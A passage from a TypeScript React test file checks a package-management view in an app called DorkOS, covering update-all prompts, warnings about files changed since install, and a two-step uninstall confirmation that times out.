      const dialog = await screen.findByRole('dialog', { name: 'Update Flow on Alpha?' });
      await user.click(within(dialog).getByRole('button', { name: 'Update Flow on Alpha' }));
      expect(applyUpdates).toHaveBeenCalledTimes(1);
    });

    it('is not offered when nothing needs updating', () => {
      showRows([FORMATTER], [makeCheck(FORMATTER)]);

      render(<InstalledPackagesView />);

      expect(screen.queryByRole('button', { name: /update all/i })).not.toBeInTheDocument();
    });
  });

  describe('whether files changed since install (DOR-2197, DOR-2320)', () => {
    const FLOW = makeInstalled({
      name: 'flow',
      type: 'plugin',
      version: '0.7.2',
      installPath: '/tmp/.dork/plugins/flow',
    });
    const MODIFIED: InstallIntegrity = {
      status: 'modified',
      changed: ['skills/a/SKILL.md', 'hooks/hooks.json'],
      missing: ['README.md'],
      added: [],
      customized: [],
    };

    // Purpose: a changed install says so on its row, with the files, and what
    // an update would do to them, before anyone presses Update.
    it('says how many files changed since install, and what an update does to them', () => {
      showRows([FLOW], [staleCheck(FLOW, '0.7.3')]);
      setIntegrity({ [FLOW.installPath]: MODIFIED });

      render(<InstalledPackagesView />);

      const note = screen.getByTestId('installation-integrity');
      expect(note).toHaveTextContent('3 files changed since install.');
      expect(note).toHaveTextContent('Updating replaces them and keeps your copies beside them.');
      expect(note).toHaveAttribute('title', 'skills/a/SKILL.md\nhooks/hooks.json\nREADME.md');
    });

    // Purpose: a linked working copy or an unreadable record is not something
    // Prepare can fix, so neither offers it.
    it('offers Prepare only for an install an older DorkOS made', () => {
      showRows([FLOW], [makeCheck(FLOW)]);
      for (const reason of ['linked', 'unreadable-record'] as const) {
        setIntegrity({ [FLOW.installPath]: { status: 'unknown', reason } });
        render(<InstalledPackagesView />);
        expect(screen.queryByRole('button', { name: /^Prepare/ })).not.toBeInTheDocument();
        cleanup();
      }
    });

    // Purpose: an unchanged install, or one not yet verified, says nothing new.
    it('adds nothing for a clean or unverified install', () => {
      showRows([FLOW], [makeCheck(FLOW)]);
      setIntegrity({ [FLOW.installPath]: { status: 'clean', customized: [] } });
      render(<InstalledPackagesView />);
      expect(screen.queryByTestId('installation-integrity')).not.toBeInTheDocument();
      cleanup();

      setIntegrity({});
      render(<InstalledPackagesView />);
      expect(screen.queryByTestId('installation-integrity')).not.toBeInTheDocument();
    });

    // Purpose: an older install says why DorkOS can't tell its files apart,
    // and offers Prepare for exactly that installation.
    it('offers Prepare for an install an older DorkOS made', async () => {
      const user = userEvent.setup();
      const onAlpha = makeInstalled({
        ...FLOW,
        scope: 'agent-local',
        agentPath: '/work/alpha',
        agentName: 'Alpha',
        installPath: '/work/alpha/.dork/plugins/flow',
      });
      showRows([onAlpha], [makeCheck(onAlpha)]);
      setIntegrity({ [onAlpha.installPath]: { status: 'unknown', reason: 'no-record' } });

      render(<InstalledPackagesView />);

      expect(screen.getByTestId('installation-integrity')).toHaveTextContent(
        'Installed by an older DorkOS, so DorkOS can’t tell its files from yours yet.'
      );
      await user.click(screen.getByRole('button', { name: 'Prepare Flow on Alpha' }));
      expect(prepareMutate).toHaveBeenCalledWith({
        name: 'flow',
        options: { installRoot: onAlpha.installPath, projectPath: '/work/alpha' },
        where: 'Alpha',
      });
    });

    // Purpose: while one installation is being prepared its button says so and
    // cannot be pressed again.
    it('shows Prepare as busy while that installation is being prepared', () => {
      showRows([FLOW], [makeCheck(FLOW)]);
      setIntegrity({ [FLOW.installPath]: { status: 'unknown', reason: 'no-record' } });
      setPrepareState({ isPending: true, variables: { name: 'flow' } });

      render(<InstalledPackagesView />);

      const button = screen.getByRole('button', { name: 'Preparing Flow' });
      expect(button).toBeDisabled();
    });

    // Purpose: the update-all confirm says, per installation, when an update
    // will replace files the person changed.
    it('warns in the update-all confirm about changed files', async () => {
      const user = userEvent.setup();
      const other = makeInstalled({ installPath: '/tmp/.dork/agents/reviewer' });
      showRows([FLOW, other], [staleCheck(FLOW, '0.7.3'), staleCheck(other, '1.3.0')]);
      setIntegrity({ [FLOW.installPath]: MODIFIED });

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Update all…' }));
      const dialog = await screen.findByRole('dialog');
      const items = within(dialog).getAllByRole('listitem');

      const flowItem = items.find((i) => i.textContent?.includes('Flow'))!;
      expect(flowItem).toHaveTextContent(
        'Your changes to 3 files will be replaced; your copies are saved beside them (.dork-old).'
      );
      const otherItem = items.find((i) => i.textContent?.includes('Reviewer'))!;
      expect(otherItem).not.toHaveTextContent('Your changes');
    });
  });

  describe('uninstall confirmation flow', () => {
    it('does not fire the mutation on the first click — enters confirm mode instead', async () => {
      const user = userEvent.setup();
      setInstalledState({ data: [makeInstalled({ name: '@dorkos/reviewer' })] });

      render(<InstalledPackagesView />);

      await user.click(screen.getByRole('button', { name: /^uninstall Reviewer$/i }));

      expect(uninstallMutate).not.toHaveBeenCalled();
      // Button now reads "Confirm" and has the destructive variant aria-label.
      expect(
        screen.getByRole('button', { name: /confirm uninstall of Reviewer/i })
      ).toBeInTheDocument();
    });

    it('fires the uninstall mutation with purge: false on the second click within the window', async () => {
      const user = userEvent.setup();
      setInstalledState({ data: [makeInstalled({ name: '@dorkos/reviewer' })] });

      render(<InstalledPackagesView />);

      await user.click(screen.getByRole('button', { name: /^uninstall Reviewer$/i }));
      await user.click(screen.getByRole('button', { name: /confirm uninstall of Reviewer/i }));

      expect(uninstallMutate).toHaveBeenCalledTimes(1);
      expect(uninstallMutate).toHaveBeenCalledWith({
        name: '@dorkos/reviewer',
        options: { purge: false },
      });
    });

    it('auto-cancels the confirm window after 3 seconds', () => {
      vi.useFakeTimers();

      try {
        setInstalledState({ data: [makeInstalled({ name: '@dorkos/reviewer' })] });

        render(<InstalledPackagesView />);

        // Use fireEvent (synchronous) to avoid userEvent's internal timers
        // fighting with vi.useFakeTimers.
        fireEvent.click(screen.getByRole('button', { name: /^uninstall Reviewer$/i }));

        expect(
          screen.getByRole('button', { name: /confirm uninstall of Reviewer/i })
        ).toBeInTheDocument();

        // Advance past the 3-second confirm window.
        act(() => {
          vi.advanceTimersByTime(3_100);
        });

        // Back to the normal uninstall button.
        expect(screen.getByRole('button', { name: /^uninstall Reviewer$/i })).toBeInTheDocument();
        expect(uninstallMutate).not.toHaveBeenCalled();
      } finally {
        vi.useRealTimers();
      }
    });

    it('disables only the row whose uninstall is in flight', () => {
      setInstalledState({
        data: [
          makeInstalled({ name: '@dorkos/reviewer' }),
          makeInstalled({ name: '@dorkos/formatter' }),
        ],
      });
      setUninstallState({ isPending: true, variables: { name: '@dorkos/reviewer' } });

      render(<InstalledPackagesView />);

      const reviewerBtn = screen.getByRole('button', { name: /uninstall Reviewer/i });
      const formatterBtn = screen.getByRole('button', { name: /^uninstall Formatter$/i });

      expect(reviewerBtn).toBeDisabled();
      expect(reviewerBtn.textContent).toMatch(/removing/i);
      expect(formatterBtn).not.toBeDisabled();
    });
  });
});
